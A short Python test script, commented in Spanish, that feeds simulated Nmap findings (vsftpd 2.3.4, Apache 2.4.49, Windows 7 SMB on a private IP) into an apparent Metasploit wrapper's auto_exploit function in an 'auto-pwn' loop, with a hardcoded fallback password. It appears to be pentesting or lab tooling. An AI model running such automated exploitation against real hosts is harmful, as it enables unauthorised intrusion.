from core.msf_commander import MsfCommander
import os

# Simulamos que Nmap encontró esto
TARGET_IP = "192.168.1.50"  # IP Ficticia
DETECTED_SERVICES = [
    (21, "vsftpd 2.3.4"),  # VULNERABLE
    (80, "Apache httpd 2.4.49"),  # (Quizás no tengamos este en el mapa aún)
    (445, "Windows 7 Professional"),  # VULNERABLE
]


def test_logic():
    # Recuerda que la contraseña ahora la toma de env o hardcodeada si no cambiaste el init
    # Asegurate de tener tus credenciales bien configuradas o pasalas aqui
    password = os.getenv("MSF_PASSWORD", "berebrum_secret")

    print("🔵 Conectando al Commander...")
    commander = MsfCommander(password=password)

    print("\n⚔️  INICIANDO PROTOCOLO AUTO-PWN DE PRUEBA ⚔️")

    for port, service in DETECTED_SERVICES:
        commander.auto_exploit(TARGET_IP, service, port)


if __name__ == "__main__":
    test_logic()
